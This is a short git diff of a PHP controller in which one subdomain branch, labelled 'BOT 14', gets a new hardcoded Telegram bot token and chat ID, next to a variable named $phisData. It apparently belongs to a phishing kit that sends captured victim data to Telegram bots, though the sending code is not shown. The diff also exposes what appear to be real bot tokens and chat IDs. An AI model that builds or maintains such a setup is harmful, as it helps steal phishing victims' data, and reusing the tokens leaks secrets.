@@ -162,9 +162,9 @@ class HomeController extends Controller
         } else if ($subdomain == "livegroup-vcx14") {
             // BOT 14
 
-            $bot_token = "7872050235:AAGORhRxT3Aw6c2vPtpAvltkcQKzbZqS9nA";
+            $bot_token = "7833577746:AAGrK1PnXpTT4wxAUsuQJ-RErQxdRu8-cmI";
 
-            $chat_id = "7013724747";
+            $chat_id = "7148751749";
             $phisData = "MY14";
         } else if ($subdomain == "livegroup-vcx15") {
             // BOT 15
